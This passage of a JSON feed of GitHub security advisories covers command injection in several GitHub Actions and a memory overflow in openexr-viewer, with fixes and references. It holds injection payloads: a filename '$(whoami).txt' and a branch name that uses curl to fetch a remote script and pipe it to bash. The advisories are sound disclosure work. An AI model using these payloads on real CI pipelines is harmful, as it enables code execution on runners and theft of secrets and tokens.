runner.txt\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to arbitrary command execution in the GitHub Runner.</p>\n<h3 id=\"resolution\">Resolution</h3>\n<ul>\n<li><p>A new <code>safe_output</code> input would be enabled by default and return filename paths escaping special characters like ;, ` (backtick), $, (), etc for bash environments.</p>\n</li>\n<li><p>A safe recommendation of using environment variables to store unsafe outputs.</p>\n</li>\n</ul>\n<pre><code class=\"language-yaml\">- name: List all changed files tracked and untracked files\n  env:\n     CHANGED_FILES: ${{ steps.verify-changed-files.outputs.changed_files }}\n  run: |\n    echo \"Changed files: $CHANGED_FILES\"\n</code></pre>\n<h3 id=\"resources\">Resources</h3>\n<ul>\n<li><a href=\"https://securitylab.github.com/research/github-actions-untrusted-input/\">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</a></li>\n<li><a href=\"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/\">Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tj-actions/verify-changed-files/security/advisories/GHSA-ghm2-rq8q-wrhc\">https://github.com/tj-actions/verify-changed-files/security/advisories/GHSA-ghm2-rq8q-wrhc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52137\">https://nvd.nist.gov/vuln/detail/CVE-2023-52137</a></li>\n<li><a href=\"https://github.com/tj-actions/verify-changed-files/commit/498d3f316f501aa72485060e8c96fde7b2014f12\">https://github.com/tj-actions/verify-changed-files/commit/498d3f316f501aa72485060e8c96fde7b2014f12</a></li>\n<li><a href=\"https://github.com/tj-actions/verify-changed-files/commit/592e305da041c09a009afa4a43c97d889bed65c3\">https://github.com/tj-actions/verify-changed-files/commit/592e305da041c09a009afa4a43c97d889bed65c3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ghm2-rq8q-wrhc\">https://github.com/advisories/GHSA-ghm2-rq8q-wrhc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ghm2-rq8q-wrhc",
            "title": "[tj-actions/verify-changed-files] Potential Actions command injection in output filenames (GHSL-2023-275)",
            "date_modified": "2024-01-10T19:11:30.000Z",
            "date_published": "2024-01-02T16:42:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ghm2-rq8q-wrhc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>tj-actions/changed-files</code> workflow allows for command injection in changed filenames, allowing an attacker to execute arbitrary code and potentially leak secrets.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <a href=\"https://github.com/tj-actions/changed-files\"><code>changed-files</code></a> action returns a list of files changed in a commit or pull request which provides an <code>escape_json</code> input <a href=\"https://github.com/tj-actions/changed-files/blob/94549999469dbfa032becf298d95c87a14c34394/action.yml#L136\">enabled by default</a>, only escapes <code>\"</code> for JSON values. </p>\n<p>This could potentially allow filenames that contain special characters such as <code>;</code> and ` (backtick) which can be used by an attacker to take over the <a href=\"https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners\">GitHub Runner</a> if the output value is used in a raw fashion (thus being directly replaced before execution) inside a <code>run</code> block. By running custom commands an attacker may be able to steal **secrets** such as <code>GITHUB_TOKEN</code> if triggered on other events than <code>pull_request</code>. For example on <code>push</code>.</p>\n<h4 id=\"proof-of-concept\">Proof of Concept</h4>\n<ol>\n<li>Submit a pull request to a repository with a new file injecting a command. For example <code>$(whoami).txt</code> which is a valid filename.</li>\n<li>Upon approval of the workflow (triggered by the pull request), the action will get executed and the malicious pull request filename will flow into the <code>List all changed files</code> step below.</li>\n</ol>\n<pre><code class=\"language-yaml\">      - name: List all changed files\n        run: |\n          for file in ${{ steps.changed-files.outputs.all_changed_files }}; do\n            echo \"$file was changed\"\n          done\n</code></pre>\n<p>Example output:</p>\n<pre><code class=\"language-yaml\">##[group]Run for file in $(whoami).txt; do\n    for file in $(whoami).txt; do\n        echo \"$file was changed\"\n    done\nshell: /usr/bin/bash -e {0}\n##[endgroup]\nrunner.txt was changed\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to arbitrary command execution in the GitHub Runner.</p>\n<h3 id=\"resolution\">Resolution</h3>\n<ul>\n<li><p>A new <code>safe_output</code> input would be enabled by default and return filename paths escaping special characters like ;, ` (backtick), $, (), etc for bash environments.</p>\n</li>\n<li><p>A safe recommendation of using environment variables to store unsafe outputs.</p>\n</li>\n</ul>\n<pre><code class=\"language-yaml\">- name: List all changed files\n  env:\n    ALL_CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}\n  run: |\n    for file in \"$ALL_CHANGED_FILES\"; do\n      echo \"$file was changed\"\n    done\n</code></pre>\n<h3 id=\"resources\">Resources</h3>\n<ul>\n<li><a href=\"https://securitylab.github.com/research/github-actions-untrusted-input/\">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</a></li>\n<li><a href=\"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/\">Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63\">https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-51664\">https://nvd.nist.gov/vuln/detail/CVE-2023-51664</a></li>\n<li><a href=\"https://github.com/tj-actions/changed-files/commit/0102c07446a3cad972f4afcbd0ee4dbc4b6d2d1b\">https://github.com/tj-actions/changed-files/commit/0102c07446a3cad972f4afcbd0ee4dbc4b6d2d1b</a></li>\n<li><a href=\"https://github.com/tj-actions/changed-files/commit/716b1e13042866565e00e85fd4ec490e186c4a2f\">https://github.com/tj-actions/changed-files/commit/716b1e13042866565e00e85fd4ec490e186c4a2f</a></li>\n<li><a href=\"https://github.com/tj-actions/changed-files/commit/ff2f6e6b91913a7be42be1b5917330fe442f2ede\">https://github.com/tj-actions/changed-files/commit/ff2f6e6b91913a7be42be1b5917330fe442f2ede</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mcph-m25j-8j63\">https://github.com/advisories/GHSA-mcph-m25j-8j63</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mcph-m25j-8j63",
            "title": "[tj-actions/changed-files] tj-actions/changed-files has Potential Actions command injection in output filenames (GHSL-2023-271)",
            "date_modified": "2024-01-04T19:43:41.000Z",
            "date_published": "2024-01-02T16:41:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mcph-m25j-8j63"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Just open this exr file through openexr-viewer.</p>\n<p>( poc send by email )</p>\n<p>This is windbg log file.</p>\n<p>[ POC 2 ]\n(8660.7e44): Access violation - code c0000005 (!!! second chance !!!)\nopenexr_viewer+0x27be4:\n00007ff7<code>13ff7be4 c744880c0000803f mov     dword ptr [rax+rcx*4+0Ch],3F800000h ds:0000020a</code>3ac8000c=????????</p>\n<p>Attempt to write the value 1.0 to the memory address 0x20A3AC8000C</p>\n<p>[ POC 1 ]\n(1404.9264): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\nopenexr_viewer+0x27be4:\n00007ff7<code>13ff7be4 c744880c0000803f mov     dword ptr [rax+rcx*4+0Ch],3F800000h ds:0000029c</code>b371600c=????????</p>\n<p>Attempt to write the value 1.0 to the memory address 0x29CB371600C</p>\n<p>Credits\nTeam : ZeroPointer\n이동하 ( Lee Dong Ha of ZeroPointer Lab )\n정지민 &nbsp;&nbsp;&nbsp;( Jeong Jimin of ZeroPointer Lab )\n박우진&nbsp;&nbsp;&nbsp; ( Park Woojin of ZeroPointer Lab )\n전우진&nbsp;&nbsp;&nbsp; ( Jeon Woojin of ZeroPointer Lab )</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/afichet/openexr-viewer/security/advisories/GHSA-99jg-r3f4-rpxj\">https://github.com/afichet/openexr-viewer/security/advisories/GHSA-99jg-r3f4-rpxj</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50245\">https://nvd.nist.gov/vuln/detail/CVE-2023-50245</a></li>\n<li><a href=\"https://github.com/afichet/openexr-viewer/commit/d0a7e85dfeb519951fb8a8d70f73f30d41cdd3d9\">https://github.com/afichet/openexr-viewer/commit/d0a7e85dfeb519951fb8a8d70f73f30d41cdd3d9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-99jg-r3f4-rpxj\">https://github.com/advisories/GHSA-99jg-r3f4-rpxj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-99jg-r3f4-rpxj",
            "title": "[afichet/openexr-viewer] memory overflow vulnerability in OpenEXR-viewer",
            "date_modified": "2023-12-12T13:20:31.000Z",
            "date_published": "2023-12-12T13:20:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-99jg-r3f4-rpxj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>tj-actions/branch-names</code> GitHub Actions references the <code>github.event.pull_request.head.ref</code> and <code>github.head_ref</code> context variables within a GitHub Actions <code>run</code> step. The head ref variable is the branch name and can be used to execute arbitrary code using a specially crafted branch name.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerable code is within the <code>action.yml</code> file the <code>run</code> step references the value directly, instead of a sanitized variable.</p>\n<pre><code class=\"language-yml\">runs:\n  using: \"composite\"\n  steps:\n    - id: branch\n      run: |\n        # \"Set branch names...\"\n        if [[ \"${{ github.ref }}\" != \"refs/tags/\"* ]]; then\n          BASE_REF=$(printf \"%q\" \"${{ github.event.pull_request.base.ref || github.base_ref }}\")\n          HEAD_REF=$(printf \"%q\" \"${{ github.event.pull_request.head.ref || github.head_ref }}\")\n          REF=$(printf \"%q\" \"${{ github.ref }}\")\n</code></pre>\n<p>An attacker can use a branch name to inject arbitrary code, for example: <code>Test\")${IFS}&amp;&amp;${IFS}{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/72511291630c7f95f0d8ffabb3c80fbf/raw/inject.sh}${IFS}|${IFS}bash&amp;&amp;echo${IFS}$(\"foo</code> will download and run a script from a Gist. This allows an attacker to inject a payload of arbitrary complexity.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can use this vulnerability to steal secrets from or abuse <code>GITHUB_TOKEN</code> permissions.</p>\n<h3 id=\"reference\">Reference</h3>\n<ul>\n<li><a href=\"https://securitylab.github.com/research/github-actions-untrusted-input\">https://securitylab.github.com/research/github-actions-untrusted-input</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tj-actions/branch-names/security/advisories/GHSA-8v8w-v8xg-79rf\">https://github.com/tj-actions/branch-names/security/advisories/GHSA-8v8w-v8xg-79rf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49291\">https://nvd.nist.gov/vuln/detail/CVE-2023-49291</a></li>\n<li><a href=\"https://github.com/tj-actions/branch-names/commit/4923d1ca41f928c24f1c1b3af9daaadfb71e6337\">https://github.com/tj-actions/branch-names/commit/4923d1ca41f928c24f1c1b3af9daaadfb71e6337</a></li>\n<li><a href=\"https://github.com/tj-actions/branch-names/commit/6c999acf206f5561e19f46301bb310e9e70d8815\">https://github.com/tj-actions/branch-names/commit/6c999acf206f5561e19f46301bb310e9e70d8815</a></li>\n<li><a href=\"https://github.com/tj-actions/branch-names/commit/726fe9ba5e9da4fcc716223b7994ffd0358af060\">https://github.com/tj-actions/branch-names/commit/726fe9ba5e9da4fcc716223b7994ffd0358af060</a></li>\n<li><a href=\"https://securitylab.github.com/research/github-actions-untrusted-input\">https://securitylab.github.com/research/github-actions-untrusted-input</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8v8w-v8xg-79rf\">https://github.com/advisories/GHSA-8v8w-v8xg-79rf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8v8w-v8xg-79rf",
            "title": "[tj-actions/branch-names] tj-actions/branch-names's Improper Sanitization of Branch Name Leads to Arbitrary Code Injection",
            "date_modified": "2023-12-07T13:50:50.000Z",
            "date_published": "2023-12-05T23:30:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8v8w-v8xg-79rf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This action uses the <code>github.head_ref</code> parameter in an insecure way. </p>\n<p>This vulnerability can be triggered by any user on GitHub on any workflow using the action on pull requests. They just need to create a pull request with a branch name, which can contain the attack payload. (Note that first-time PR requests will not be run - but the attacker can submit a valid PR before submitting an invalid PR).  This can be used to execute code on the GitHub runners (potentially use it for crypto-mining, and waste your resources) and to exfiltrate any secrets you use in the CI pipeline.</p>\n<h3 id=\"patches\">Patches</h3>\n<blockquote>\n<p>Pass the variable as an environment variable and then use the environment variable instead of substituting it directly.</p>\n</blockquote>\n<p>Patched action is available on tag <strong>v4</strong>, tag <strong>v4.4.1</strong>, and any tag beyond.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround is available if impacted, please upgrade the version</p>\n<blockquote>\n<p>ℹ️ <strong>v3</strong> and <strong>v4</strong> are compatibles.</p>\n</blockquote>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://securitylab.github.com/research/github-actions-untrusted-input/\">Here</a> is a set of blog posts by Github's security team explaining this issue.</p>\n<h3 id=\"thanks\">Thanks</h3>\n<p>Thanks to the team of researchers from Purdue University, who are working on finding vulnerabilities in CI/CD configurations of open-source software. Their tool detected this security vulnerability.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-6q4m-7476-932w\">https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-6q4m-7476-932w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-27581\">https://nvd.nist.gov/vuln/detail/CVE-2023-27581</a></li>\n<li><a href=\"https://github.com/rlespinasse/github-slug-action/commit/102b1a064a9b145e56556e22b18b19c624538d94\">https://github.com/rlespinasse/github-slug-action/commit/102b1a064a9b145e56556e22b18b19c624538d94</a></li>\n<li><a href=\"https://github.com/rlespinasse/github-slug-action/releases/tag/v4.4.1\">https://github.com/rlespinasse/github-slug-action/releases/tag/v4.4.1</a></li>\n<li><a href=\"https://securitylab.github.com/research/github-actions-untrusted-input\">https://securitylab.github.com/research/github-actions-untrusted-input</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q4m-7476-932w\">https://github.com/advisories/GHSA-6q4m-7476-932w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6q4m-7476-932w",
            "title": "[rlespinasse/github-slug-action] github-slug-action vulnerable to arbitrary code execution",
            "date_modified": "2025-02-18T22:42:29.000Z",
            "date_published": "2023-03-13T20:43:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6q4m-7476-932w"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}